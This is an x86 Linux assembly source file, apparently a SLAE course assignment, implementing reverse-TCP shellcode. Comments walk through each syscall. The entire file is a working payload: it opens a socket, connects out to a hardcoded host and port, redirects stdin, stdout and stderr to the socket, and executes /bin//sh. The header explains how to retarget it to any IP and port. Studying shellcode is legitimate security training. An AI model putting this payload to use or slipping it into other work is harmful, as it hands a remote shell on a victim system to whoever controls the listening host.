; SLAE Assignment 2
; Ben Chase
; Student ID: SLAE-860
; License:  Creative Commons
; Shell-Reverse-TCP shellcode implementation
; Run shconfig2.py, specify -p <port number> -i <ip address>.  Copy shellcode to shellcode.c skeleton, compile and run.


global _start

section .text

        _start:
                push 0x66
                pop eax
                push 0x1
                pop ebx                 ; Socketcall - Socket() register setup

                xor esi,esi
                push esi
                push ebx
                push 0x2                ; End of socket() parameters
                mov ecx, esp            ; Pointer to socket parameters
                int 0x80                ; Should return a socket FD in EAX

                xor edi, edi            ; Clear any stale value out of edi
                xchg edi, eax           ; Save the socket FD

                push 0x66
                pop eax
                push 0x2
                pop ebx                 ; Socketcall - Bind() register setup

                xor ecx, ecx
                push ecx                ; 0 should point to any IP
                push word 0x611b        ; Port 7477 default value
                push word bx            ; Should be 0x2
                mov ecx, esp            ; Pointer to sockaddr structure
                push 0x10               ; 16 bytes
                push ecx                ; Pointer to sockaddr
                push edi                ; Socket FD
                mov ecx, esp
                int 0x80                ; Bind that socket.  Dooooo it....

                mov al, 0x66
                mov bl, 0x3             ; Socketcall - connect() register setup

                push 0x670110ac         ; 172.16.1.103 default value
                push word 0x611e        ; Port 7777 default value
                push word 0x2           ; AF_INET
                mov ecx, esp            ; Stack pointer should pt to addr
                push 0x10               ; 16 bytes for sockaddr
                push ecx                ; ptr to addr
                push edi                ; our FD
                mov ecx, esp            ; ptr to connect() args
                int 0x80                ; Socket should be connected

                push edi
                pop ebx                 ; our FD for dup2

                xor ecx, ecx            ; Clear any stale values present in ecx
                mov cl, 0x2             ; One for stdin, stdout, stderr
        looper:
                mov al, 0x3f            ; Dup2() syscall
                int 0x80
                dec ecx                 ; Current value of ecx should match FD for either
                                        ; STDIN, STDOUT, STDERR.
                jns looper
                                        ; At this point the socket should be redirected to
                                        ; STDIN, STDOUT, STDERR.

                mov al, 0x0b            ; Execve()
                xor ecx, ecx
                push ecx                ; Terminating Null

                push 0x68732f2f
                push 0x6e69622f

                mov ebx, esp            ; Pointer to the encoded /bin//sh
                xor ecx, ecx
                xor edx, edx
                int 0x80
